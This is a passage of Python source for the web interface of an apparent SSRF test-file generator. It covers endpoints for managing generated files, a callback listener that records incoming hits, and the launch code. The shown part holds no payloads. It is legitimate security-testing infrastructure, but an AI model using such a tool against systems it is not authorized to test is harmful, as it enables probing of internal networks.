    def api_files():
        return jsonify({"ok": True, "files": list_output_files()})

    @app.post("/api/files/delete")
    def api_file_delete():
        data = request.get_json(force=True, silent=True) or {}
        name = data.get("name", "")
        target = safe_join_output(name)
        if not target or not os.path.isfile(target):
            return jsonify({"ok": False, "error": "file not found"}), 404
        try:
            os.remove(target)
            return jsonify({"ok": True})
        except OSError as e:
            return jsonify({"ok": False, "error": str(e)}), 500

    # ---------- monitor ----------

    @app.get("/api/hits")
    def api_hits():
        st = MON.status()
        st["hits"] = MON.snapshot()[-500:]  # newest 500 cap
        st["ok"] = True
        return jsonify(st)

    @app.post("/api/hits/clear")
    def api_hits_clear():
        MON.clear()
        return jsonify({"ok": True})

    @app.get("/api/hits/export")
    def api_hits_export():
        payload = json.dumps(MON.snapshot(), indent=2, ensure_ascii=False)
        return Response(
            payload, mimetype="application/json",
            headers={"Content-Disposition":
                     "attachment; filename=callback_hits.json"})

    @app.post("/api/monitor")
    def api_monitor():
        data = request.get_json(force=True, silent=True) or {}
        action = data.get("action")
        port = int(data.get("port") or 8888)
        bind = (data.get("bind") or "0.0.0.0").strip()
        try:
            if action == "start":
                MON.start(port, bind)
            elif action == "stop":
                MON.stop()
            elif action == "restart":
                MON.restart(port, bind)
            else:
                return jsonify({"ok": False, "error": "unknown action"}), 400
            return jsonify({"ok": True, **MON.status()})
        except (OSError, RuntimeError, ValueError) as e:
            MON.last_error = str(e)
            return jsonify({"ok": False, "error": str(e)}), 500

    return app


# ============================================================
#                           Main
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="PDF & HTML SSRF Test File Generator — Web UI v%s "
                    "(authorized testing only)" % WEB_VERSION)
    parser.add_argument("--host", default="127.0.0.1",
                        help="Web UI bind address (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=5000,
                        help="Web UI port (default: 5000)")
    parser.add_argument("--listen-port", type=int, default=8888,
                        help="Callback monitor port (default: 8888)")
    parser.add_argument("--listen-bind", default="0.0.0.0",
                        help="Callback monitor bind address (default: 0.0.0.0)")
    parser.add_argument("--no-monitor", action="store_true",
                        help="Do not start the callback monitor on launch")
    parser.add_argument("--no-browser", action="store_true",
                        help="Do not auto-open the browser")
    args = parser.parse_args()

    os.makedirs(OUTPUT_DIR, exist_ok=True)

    if not args.no_monitor:
        try:
            MON.start(args.listen_port, args.listen_bind)
            print("[MONITOR] Callback listener on %s:%d (always on)"
                  % (args.listen_bind, args.listen_port))
        except OSError as e:
            MON.last_error = str(e)
            print("[MONITOR] Failed to bind %s:%d — %s"
                  % (args.listen_bind, args.listen_port, e))
            print("[MONITOR] You can start it later from the web UI.")

    if not args.no_browser:
        def open_browser():
            import time
            import webbrowser
            time.sleep(1.0)
            host = "127.0.0.1" if args.host in ("0.0.0.0", "::") else args.host
            webbrowser.open("http://%s:%d/" % (host, args.port))
        threading.Thread(target=open_browser, daemon=True).start()

    app = create_app()
    url_host = "127.0.0.1" if args.host in ("0.0.0.0", "::") else args.host
    print("[WEB] SSRF generator web UI: http://%s:%d/" % (url_host, args.port))
    print("[WEB] Generator core: pdf_ssrf_gen5 v%s"
          % getattr(gen, "__version__", "?"))
    print("[WEB] Output directory: %s" % OUTPUT_DIR)
    app.run(host=args.host, port=args.port, threaded=True)


if __name__ == "__main__":
    main()
